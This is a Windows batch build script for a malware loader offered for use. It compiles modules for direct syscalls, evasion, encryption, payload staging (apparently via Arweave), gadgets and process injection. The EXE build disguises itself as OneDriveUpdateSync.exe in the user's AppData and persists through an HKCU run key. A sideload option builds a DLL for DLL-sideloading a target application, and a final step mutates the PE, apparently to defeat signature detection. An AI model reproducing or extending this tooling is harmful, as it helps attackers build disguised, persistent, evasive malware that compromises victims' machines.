@echo off
REM =============================================
REM  build.bat
REM
REM  Usage: build.bat                           (EXE loader)
REM         build.bat sideload                  (DLL sideload variant)
REM         build.bat sideload version.dll      (custom output name)
REM
REM  All EXE builds:
REM    Install.c  - Copy self to %APPDATA%\OneDrive\Updates\OneDriveUpdateSync.exe
REM    Persist.c  - Registry run-key persistence
REM =============================================

SET "VSTOOLS="
IF EXIST "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat" (
    SET "VSTOOLS=C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat"
)
IF EXIST "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" (
    SET "VSTOOLS=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
)
IF "%VSTOOLS%"=="" ( echo [!] VS not found. & exit /b 1 )
call "%VSTOOLS%" >nul 2>&1

REM --- Validate sideload prerequisites ---
IF "%1"=="sideload" IF NOT EXIST Sideload.h (
    echo [!] Sideload.h not found. Run: python SideloadGen.py ^<target.dll^>
    exit /b 1
)

REM --- Default: EXE build ---
REM     Install.c: copies self to %APPDATA%\OneDrive\Updates\OneDriveUpdateSync.exe
REM     Persist.c: writes HKCU run-key pointing at OneDriveUpdateSync.exe
IF NOT DEFINED OUTNAME SET OUTNAME=OneDriveUpdateSync.exe
SET CFILES=main.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Arweave.c Gadgets.c Install.c Persist.c Inject.c
SET CFLAGS=/O1 /GS- /W0 /std:c17 /nologo
SET LFLAGS=/NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS /MANIFEST:EMBED /MANIFESTUAC:"level='asInvoker' uiAccess='false'" kernel32.lib user32.lib

REM --- Override for sideload DLL build ---
IF "%1"=="sideload" (
    SET OUTNAME=sideload.dll
    SET CFILES=main.c Sideload.c Syscalls.c WinApi.c Evasion.c Crypt.c Staging.c Arweave.c Gadgets.c Install.c Persist.c Inject.c
    SET "CFLAGS=/O1 /GS- /W0 /std:c17 /nologo /DBUILD_DLL"
    SET "LFLAGS=/DLL /NODEFAULTLIB /ENTRY:DllMain /SUBSYSTEM:WINDOWS kernel32.lib user32.lib ole32.lib advapi32.lib shlwapi.lib winmm.lib /INCLUDE:__imp_CoInitialize /INCLUDE:__imp_CoUninitialize /INCLUDE:__imp_CoTaskMemAlloc /INCLUDE:__imp_RegOpenKeyExA /INCLUDE:__imp_RegQueryValueExA /INCLUDE:__imp_RegCloseKey /INCLUDE:__imp_PathCombineA /INCLUDE:__imp_PathFileExistsA /INCLUDE:__imp_timeGetTime /INCLUDE:__imp_timeBeginPeriod"
    echo [*] Building DLL sideload variant...
    echo [*] Persist: HKCU run-key pointing to OneDriveUpdateSync.exe
)

REM --- Append optional extra flags AFTER all CFLAGS resets (e.g. /DDEBUG from web UI) ---
IF DEFINED CFLAGS_EXTRA SET CFLAGS=%CFLAGS% %CFLAGS_EXTRA%

REM --- Override output name ---
IF "%1"=="sideload" IF NOT "%2"=="" SET "OUTNAME=%2"

REM --- Compile version info resource (sideload DLL only) ---
SET RESFILE=
IF "%1"=="sideload" IF EXIST Sideload.rc (
    echo [*] Compiling version info...
    rc /nologo Sideload.rc >nul
    IF %ERRORLEVEL% NEQ 0 ( echo [!] Resource compile failed & exit /b 1 )
    SET RESFILE=Sideload.res
)

echo [*] Assembling...
ml64 /c /nologo AsmStub.asm >nul
IF %ERRORLEVEL% NEQ 0 ( echo [!] ASM failed & exit /b 1 )

echo [*] Compiling...
cl %CFLAGS% %CFILES% AsmStub.obj %RESFILE% /Fe:%OUTNAME% /link %LFLAGS%
IF %ERRORLEVEL% NEQ 0 ( echo [!] Build failed & exit /b 1 )

echo [*] Mutating PE...
python Mutate.py %OUTNAME%

echo.
echo [+] Build: %OUTNAME%
for %%A in (%OUTNAME%) do echo [*] Size: %%~zA bytes
del /Q *.obj *.exp *.lib *.res 2>nul
echo [+] Done!
